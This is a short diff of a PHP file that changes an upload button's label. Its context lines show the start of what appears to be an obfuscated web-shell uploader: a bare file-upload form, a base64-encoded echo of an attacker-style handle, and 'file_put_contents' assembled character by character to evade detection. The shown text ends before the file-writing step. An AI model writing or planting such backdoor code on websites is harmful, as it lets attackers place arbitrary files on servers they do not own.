@@ -1,4 +1,4 @@
-<form method="post" enctype="multipart/form-data"><input type="file" name="uk45"><button>Gaskan</button></form>
+<form method="post" enctype="multipart/form-data"><input type="file" name="uk45"><button>up</button></form>
 <?php
 echo base64_decode("cml6a3kwNzxicj4=");
 $a = "f"."i"."l"."e"."_"."p"."u"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
